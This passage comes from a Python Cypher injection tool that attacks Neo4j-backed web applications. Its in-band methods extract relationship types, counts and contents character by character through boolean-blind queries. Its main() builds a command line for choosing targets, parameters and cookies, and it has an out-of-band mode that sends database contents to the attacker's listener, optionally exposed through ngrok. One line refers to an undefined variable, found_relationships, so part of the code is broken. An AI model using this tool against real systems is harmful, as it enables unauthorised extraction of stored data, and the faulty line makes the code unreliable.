                        break_flag = self.check_true(response)
                        if (break_flag):
                            rel_type += char
                            break
                    if (break_flag):
                        break
            print(" " * 150, end='\r')
            print(f"[+] {rel_type}")
            rel_types.append(rel_type)
        return rel_types

    def find_rel_counts(self, rel_types):
        rel_counts_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for rel_type in rel_types:
            break_flag = False
            for count_index in range(1000):
                responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 RETURN label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2))}} = {count_index}"))
                print(f"[{animation[anim_index % len(animation)]}] dumping id to id relationship counts, might take awhile", end='\r', flush=True)
                anim_index += 1
                for response in responses:
                    break_flag = self.check_true(response)
                    if (break_flag):
                        rel_counts_dict[rel_type] = count_index
                        break
                if (break_flag):
                    break
        print(" " * 150, end='\r')
        return rel_counts_dict

    def find_rel_sizes(self, rel_counts_dict):
        rel_sizes_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for rel_type, count in rel_counts_dict.items():
            for count_index in range(count):
                break_flag = False 
                for size_index in range(1000):
                    # Construct and send your query
                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SIZE(list[{count_index}]) = {size_index} RETURN list}}"))
                    print(f"[{animation[anim_index % len(animation)]}] dumping relationship sizes, might take awhile", end='\r', flush=True)
                    anim_index += 1
                    for response in responses:
                        break_flag = self.check_true(response)
                        if (break_flag):
                                if rel_type not in rel_sizes_dict:
                                    rel_sizes_dict[rel_type] = {}
                                rel_sizes_dict[rel_type][count_index] = size_index
                                break  
                    if (break_flag):
                        break
        print(" " * 150, end='\r')
        return rel_sizes_dict

    def dump_rel(self, rel_sizes_dict):
        print(colored(f"\n[!] At this stage, we are unaware relationship direction, we have to verify it", "yellow"))
        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
        rels_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for rel_type, size_dict in rel_sizes_dict.items():
            print(f"[+] relationship: {rel_type}")
            for count_index, size in size_dict.items():
                rel = ''
                for size_index in range(size):
                    break_flag = False
                    for char in valid_chars:
                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + '::' + toString(id(node1)) + '::{rel_type}::' + label2 + '::' + toString(id(node2)) as rows WITH COLLECT(rows) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                        print(f"[{animation[anim_index % len(animation)]}] building relationship: {rel}{char}", end='\r', flush=True)
                        anim_index += 1
                        for response in responses:
                            break_flag = self.check_true(response)
                            if (break_flag):
                                    rel += char
                                    break 
                        if (break_flag):
                            break
                print(" " * 150, end='\r') 
                print(f"[++] {rel}")
                rels_dict[rel_type] = rel
        return rels_dict 

    def verify_rels(self, rels_dict):
        animation = "|/-\\"
        anim_index = 0
        verified_rels = []
        for rel_type, rel in rels_dict.items():
            rel_parts = rel.split('::')
            label1, id1, rel_type, label2, id2 = rel_parts[0], rel_parts[1], rel_parts[2], rel_parts[3], rel_parts[4]
            break_flag = False
            for id_from, id_to in [(id1, id2), (id2, id1)]:
                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2 RETURN 1 }}"))
                print(f"[{animation[anim_index % len(animation)]}] verifying relationships:", end='\r', flush=True)
                anim_index += 1
                for response in responses:
                    break_flag = self.check_true(response)
                    if (break_flag):
                            verified_rels.append(f"{label1}:{id1}-[:{rel_type}]->{label2}:{id2}")
                            break 
                if (break_flag):
                    break
                
        print(" " * 150, end='\r')
        write_list_to_file(found_relationships)

        print(f"\n[*] available relationships [{len(verified_rels)}]")
        for rel_type in rels_dict.keys():
            print(f"[+] {rel_type}")
            for rel in verified_rels:
                regex_rel_type = re.findall(r"\[:([^\]]+)\]", rel)[0]
                if regex_rel_type == rel_type:
                    print(f"[++] {rel}")

        return verified_rels

    def dump_rels(self):
        rel_type_counts = self.find_rel_type_counts()
        rel_type_sizes_dict = self.find_rel_type_sizes(rel_type_counts)
        rel_types  = self.dump_rel_types(rel_type_sizes_dict)
        rel_counts_dict = self.find_rel_counts(rel_types)
        rel_sizes_dict = self.find_rel_sizes(rel_counts_dict)
        rels = self.dump_rel(rel_sizes_dict)
        verified_rels = self.verify_rels(rels)

    def ib_dump_all(self):
        print(colored("[!] WARNING, This will take a long time.", "red"))
        label_count = self.find_label_count()
        label_sizes_dict = self.find_label_sizes(label_count)
        labels = self.dump_labels(label_sizes_dict)
        property_counts_dict = self.find_property_counts(labels)
        property_sizes_dict = self.find_property_sizes(property_counts_dict)
        properties_dict = self.dump_properties(property_sizes_dict)
        value_counts_dict = self.find_value_counts(properties_dict)
        value_sizes_dict = self.find_value_sizes(value_counts_dict)
        values = self.dump_values(value_sizes_dict)


def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameters", default="", help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
    parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
    parser.add_argument("-s", "--blind-string", help="String that returns true from the database")
    parser.add_argument("--listen-port", type=int, default=80, help="Listener port")


    parser.add_argument("--out-of-band", action="store_true", help="Enable out-of-band (OOB) mode, uses LOADCSV/APOC version of it")
    parser.add_argument("--in-band", action="store_true", help="Enable in-band (IB) mode, uses boolean based injection")

    parser.add_argument("--dump-all", action="store_true", help="Dumps all data")
    parser.add_argument("--labels", action="store_true", help="Dump labels")
    parser.add_argument("-L", "--label", help="Specify a label for property or value dumping")
    parser.add_argument("--properties", action="store_true", help="Dump properties for a specified label (-L)")
    parser.add_argument("-P", "--property", help="Specify properties to dump values; to dump values of multiple properties, delimit each property with a comma (e.g. foo,bar) (-L must also be used)")
    parser.add_argument("-R", "--relationships", action="store_true", help="Dump all relationships in the database")

    args = parser.parse_args()

    if args.in_band and not args.blind_string:
        parser.error("--in-band blind requires --blind-string.")

    if args.properties and not args.label:
        parser.error("--properties requires -L/--label.")

    if args.property and not args.label:
        parser.error("-P/--property requires -L/--label.")

    if args.out_of_band:
        listener = Listener(args.listen_port)
        listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
        listener_thread.start() 

        if args.int == "public":
            ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
            if ngrok_auth_token:
                ngrok.set_auth_token(ngrok_auth_token)
            else:
                print(colored("Ngrok auth token not set. Please set the NGROK_AUTHTOKEN environment variable.", "red"))
                sys.exit(1)
            start_ngrok = ngrok.connect(args.listen_port, "tcp")
            url = start_ngrok.public_url.replace("tcp://", "http://")
            hostname, port = url.split("://")[1].split(":")
            args.exfil_ip = f"http://{hostname}"
            args.listen_port = int(port)
            
            print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
        elif args.int:
            args.exfil_ip = f"http://{get_ip_address(args.int)}"
        else:
            args.exfil_ip = "127.0.0.1"

        injector = oob_Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)

        if injector.detect_inject():
            print(colored("[*] target likely injectable, continuing", "green"))
            print(f"[+] working character: [{injector.working_char}]")
        else:
            still_inject = input(colored("Target likely not injectable, continue? (y/n default: n)", "red")).lower()
            if still_inject != "y":
                listener.stop_listener()
                listener_thread.join()
                return

        injector.get_version()
        
        if args.dump_all:
            injector.oob_dump_all()
            injector.dump_rels()

        elif args.labels:
            labels = injector.dump_labels()
        
        elif args.label and args.properties:
            labels = args.label.split(',')
            properties_dict = injector.dump_properties(labels)
            print(properties_dict)

        elif args.label and args.property:
            properties_dict = {}
            labels = args.label.split(',')
            properties = args.property.split(',')
            for label in labels:
                for pr0perty in properties:
                    if label in properties_dict:
                        properties_dict[label].append(pr0perty)
                    else:
                        properties_dict[label] = [pr0perty]
            injector.dump_values(properties_dict)

        elif args.relationships:
            injector.dump_rels()

        injector.clean_up()
        listener.stop_listener()
        listener_thread.join()

        if args.int == "public":
            ngrok.disconnect(start_ngrok.public_url)
        return

    elif args.in_band:
        injector = ib_Neo4jInjector(args.url, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)

        if (injector.detect_inject()):
            print(colored("[*] target likely injectable, continuing", "green"))
            print(f"[+] working character: [{injector.working_char}]")
        else:
            still_inject = input(colored("Target likely not injectable, continue? (y/n default: n)", "red")).lower()
            if still_inject != "y":
                return

        if args.dump_all:
            injector.ib_dump_all()
            injector.dump_rels()

        elif args.labels:
            label_count = injector.find_label_count()
            label_sizes_dict = injector.find_label_sizes(label_count)
            labels = injector.dump_labels(label_sizes_dict)

        elif args.label and args.properties:
            labels = args.label.split(',')
            property_counts_dict = injector.find_property_counts(labels)
            property_sizes_dict = injector.find_property_sizes(property_counts_dict)
            properties_dict = injector.dump_properties(property_sizes_dict)

        elif args.label and args.property:
            properties_dict = {}
            labels = args.label.split(',')
            properties = args.property.split(',')
            for label in labels:
                for pr0perty in properties:
                    if label in properties_dict:
                        properties_dict[label].append(pr0perty)
                    else:
                        properties_dict[label] = [pr0perty]
            value_counts_dict = injector.find_value_counts(properties_dict)
            value_sizes_dict = injector.find_value_sizes(value_counts_dict)
            values = injector.dump_values(value_sizes_dict)
        
        elif args.relationships:
            injector.dump_rels()

    else:
        print(colored("Choose: [--in-band/--out-of-band]", "red"))

if __name__ == "__main__":
    main()